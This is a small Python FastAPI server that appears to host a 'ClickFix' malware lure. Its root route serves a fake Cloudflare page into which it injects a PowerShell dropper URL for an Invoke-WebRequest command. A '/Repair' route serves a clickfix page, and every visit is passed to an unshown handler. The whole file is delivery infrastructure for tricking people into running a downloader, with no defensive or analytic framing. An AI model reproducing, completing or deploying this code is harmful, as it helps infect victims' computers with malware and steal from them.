from fastapi import FastAPI,Request
from fastapi.responses import FileResponse,HTMLResponse
from do import DoShit
import asyncio
import aiofiles
import configparser



config = configparser.ConfigParser()
config.read("names.conf")


app = FastAPI()







@app.get("/")
async def root_route(req:Request):
    await DoShit(req).start("now")

    async with aiofiles.open(config["Paths"]["cloudflare_page"],encoding="utf-8") as f:
        html = await f.read()
    return HTMLResponse(
        html.replace("{{PSScript URL for IWR}}",config["Urls"]["powershell_dropper_url"])
    )

@app.get("/Repair")
async def repair(req:Request):
    await DoShit(req).start("now")
    return FileResponse(
        config["Paths"]["clickfix_page"]
    )



if __name__=="__main__":
    import os
    from colorama import init
    init()
    os.system(
        "uvicorn main:app --port 9000 --host 0.0.0.0 --reload"
    )